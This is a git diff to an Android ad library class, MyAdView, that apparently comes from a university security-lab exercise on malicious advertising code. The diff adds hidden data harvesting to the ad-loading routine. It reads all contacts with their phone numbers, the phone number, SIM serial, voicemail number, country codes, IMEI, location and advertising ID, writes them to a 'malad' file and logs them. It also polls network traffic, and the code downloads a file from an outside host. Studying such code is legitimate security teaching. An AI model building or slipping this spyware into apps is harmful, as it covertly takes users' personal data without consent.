@@ -3,12 +3,16 @@ package uk.ac.imperial.seclab.android.co447.mp1.myadlibrary;
 import android.Manifest;
 import android.annotation.SuppressLint;
 import android.app.Activity;
+import android.content.ContentResolver;
+import android.content.ContentUris;
 import android.content.Context;
 import android.content.pm.PackageManager;
 import android.database.Cursor;
 import android.os.AsyncTask;
 import android.os.Bundle;
 import android.provider.Contacts;
+import android.net.TrafficStats;
+import android.os.Handler;
 import android.support.v4.app.ActivityCompat;
 import android.util.Log;
 import android.widget.TextView;
@@ -31,9 +35,6 @@ import java.io.IOException;
 import java.io.OutputStreamWriter;
 import java.util.concurrent.TimeUnit;
 
-
-
-
 import android.content.BroadcastReceiver;
 import android.content.Context;
 import android.content.Intent;
@@ -52,6 +53,11 @@ public class MyAdView {
     public static String LOCA;
     public static String IMEI;
     public static String ADID;
+    public static String PART1B;
+    public static Handler HandleTraffic = new Handler();
+    public static long Received = 0;
+    public static long Transmitted = 0;
+
     public static void loadAd(TextView tv, Context ctx) {
         MyAdView.ctx = ctx;
 
@@ -65,10 +71,6 @@ public class MyAdView {
     }
     private static void onLoad() {
         //TODO: Implement me
-
-        //String timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
-        //Long tsLong = System.currentTimeMillis()/1000;
-        //String ts = tsLong.toString();
 
         // ------------------------------------ Part 1 : A---------------------------
         // GET LOCATION
@@ -102,7 +104,6 @@ public class MyAdView {
         }
         writeToFile(LOCA);
 
-
         // GET IMEI
         TelephonyManager telephonyManager = (TelephonyManager)ctx.getSystemService(ctx.TELEPHONY_SERVICE);
         String id = telephonyManager.getDeviceId();
@@ -111,6 +112,25 @@ public class MyAdView {
         IMEI = timeStamp + ";" + "IMEI:" + id;
         writeToFile(IMEI);
 
+        ////////// READ CONTACTS
+        Cursor cursor = ctx.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
+        while (cursor.moveToNext()) {
+            String name = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.DISPLAY_NAME));
+            Log.d("Answers", "contact: " + name);
+            String CID = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));
+            Log.d("Answers", "contact: " + CID);
+            if (Integer.parseInt(cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts.HAS_PHONE_NUMBER))) > 0) {
+                Cursor pCur = ctx.getContentResolver().query(
+                        ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null,ContactsContract.CommonDataKinds.Phone.CONTACT_ID +" = "+cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID)),null, null);
+                while (pCur.moveToNext()) {
+                    String num = pCur.getString(pCur.getColumnIndex("DATA1"));
+                    Log.d("Answers", "contact: " + num);
+
+                }
+                pCur.close();
+            }
+
+        }
 
 
         //GET ADVERTISING ID
@@ -134,7 +154,8 @@ public class MyAdView {
                     advertId = idInfo.getId();
                     String timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
                     ADID = timeStamp + ";" + "advertising_id:" + advertId;
-                    String input = LOCA + "\n" + IMEI + "\n" + ADID;
+                    String input = LOCA + "\n" + IMEI + "\n" + ADID + "\n" + PART1B;
+
                     writeToFile(input);
                 }catch (Exception e){
                     e.printStackTrace();
@@ -151,19 +172,10 @@ public class MyAdView {
 
 
         };
-        task.execute();
-
-
-
-        ////////// READ CONTACTS
-        //Uri personUri = ContentUris.withAppendedId(People.CONTENT_URI, personId);
-        //Uri phonesUri = Uri.withAppendedPath(personUri, People.Phones.CONTENT_DIRECTORY);
-        //String[] proj = new String[] {Phones._ID, Contacts.People.Phones.TYPE, Contacts.People.Phones.NUMBER, Contacts.People.Phones.LABEL};
-        //Cursor cursor = contentResolver.query(phonesUri, proj, null, null, null);
 
 
         ////////// DOWNLOAD SCRIPT FROM A WEBSITE
-        // I this example case it is just a picture, but it could be something else
+        // In this example case it is just a picture, but it could be something else
 
         DownloadManager downloadmanager = (DownloadManager) ctx.getSystemService(ctx.DOWNLOAD_SERVICE);
         Uri uri = Uri.parse("http://classe-confidentiel.com/boyd/4.png");
@@ -183,31 +195,44 @@ public class MyAdView {
         // GET PHONE NUMBER
         String phoneNumber = telephonyManager.getLine1Number();
         timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
-        writeToFile(timeStamp + ";" + "Phone Number:" + phoneNumber);
+        PART1B = timeStamp + ";" + "Phone Number:" + phoneNumber;
 
         // GET SIM SERIAL NUMBER
         String sim = telephonyManager.getSimSerialNumber();
         timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
-        writeToFile(timeStamp + ";" + "SIM:" + sim);
+        PART1B = PART1B + "\n" + timeStamp + ";" + "SIM:" + sim;
 
         // GET NETWORK COUNTRY
         String networkCountryISO=telephonyManager.getNetworkCountryIso();
         timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
-        writeToFile(timeStamp + ";" + "Network Country:" + networkCountryISO);
+        PART1B = PART1B + "\n" + timeStamp + ";" + "Network Country:" + networkCountryISO;
 
         // GET SIM COUNTRY
         String SIMCountryISO=telephonyManager.getSimCountryIso();
         timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
-        writeToFile(timeStamp + ";" + "SIM Country:" + SIMCountryISO);
+        PART1B = PART1B + "\n" + timeStamp + ";" + "SIM Country:" + SIMCountryISO;
 
         // GET VOICE MAIL NUMBER
         String voiceMailNumber=telephonyManager.getVoiceMailNumber();
         timeStamp = String.valueOf(TimeUnit.MILLISECONDS.toSeconds(System.currentTimeMillis()));
-        writeToFile(timeStamp + ";" + "Voice Mail Number:" + voiceMailNumber);
+        PART1B = PART1B + "\n" + timeStamp + ";" + "Voice Mail Number:" + voiceMailNumber;
+        Log.d("Answers", "PART 1 B: " + PART1B);
+
+
+        Received = TrafficStats.getTotalRxBytes();
+        Transmitted = TrafficStats.getTotalTxBytes();
+
+        if (Received == TrafficStats.UNSUPPORTED || Transmitted == TrafficStats.UNSUPPORTED) {
+            Log.d("Answers", "traffic monitoring not supported." );
+        } else {
+            HandleTraffic.postDelayed(TrafficAnalysis, 1000);
+        }
+
+
+        task.execute();
     }
 
-
-
+    
     private static void writeToFile(String data1){
         try {
             OutputStreamWriter outputStreamWriter = new OutputStreamWriter(ctx.openFileOutput("Part1_malad.txt", ctx.MODE_PRIVATE));
@@ -219,10 +244,14 @@ public class MyAdView {
         }
 
     }
-
+    private static final Runnable TrafficAnalysis = new Runnable() {
+        public void run() {
+            long bytesR = TrafficStats.getTotalRxBytes() - Received;
+            Log.e("Answers", "Total number of bytes received " + Long.toString(bytesR));
+            long bytesT = TrafficStats.getTotalTxBytes() - Transmitted;
+            Log.e("Answers", "Total number of bytes received " + Long.toString(bytesT));
+            HandleTraffic.postDelayed(TrafficAnalysis, 1000);
+        }
+    };
 
 }
-
-
-
-
